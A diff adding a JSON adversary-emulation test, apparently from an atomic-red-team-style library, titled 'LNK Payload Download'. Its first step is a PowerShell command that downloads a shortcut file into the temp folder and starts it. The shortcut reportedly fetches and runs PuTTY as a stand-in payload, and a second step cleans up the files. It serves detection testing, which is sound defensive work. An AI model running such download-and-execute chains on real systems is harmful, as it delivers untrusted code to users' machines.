@@ -1,0 +1,44 @@
+{
+  "id": "581d7521-9c4b-420e-9695-2aec5241167f",
+  "name": "LNK Payload Download",
+  "description": "This lnk files invokes powershell to download putty from the internet and opens the file. https://twitter.com/ankit_anubhav/status/1518932941090410496",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "eb05c314-b135-4f4c-92a1-de9dd59177d9",
+      "type": "execute-command",
+      "data": {
+        "command": "Invoke-WebRequest -OutFile $env:Temp\\test10.lnk \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\"\n$file1 = \"$env:Temp\\test10.lnk\"\nStart-Process $file1\nStart-Sleep -s 10\ntaskkill /IM a.exe /F\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5ad7df17-b735-45d7-aeae-b78f6f1dfc60",
+      "type": "execute-command",
+      "data": {
+        "command": "$file1 = \"$env:Temp\\test10.lnk\"\n$file2 = \"$env:Temp\\a.exe\"\nRemove-Item $file1 -ErrorAction Ignore\nRemove-Item $file2 -ErrorAction Ignore",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "eb05c314-b135-4f4c-92a1-de9dd59177d9",
+      "p": "on-success",
+      "o": "5ad7df17-b735-45d7-aeae-b78f6f1dfc60"
+    },
+    {
+      "s": "eb05c314-b135-4f4c-92a1-de9dd59177d9",
+      "p": "on-failure",
+      "o": "5ad7df17-b735-45d7-aeae-b78f6f1dfc60"
+    }
+  ],
+  "tags": [
+    "T1204.002",
+    "atomic-red-team"
+  ]
+}
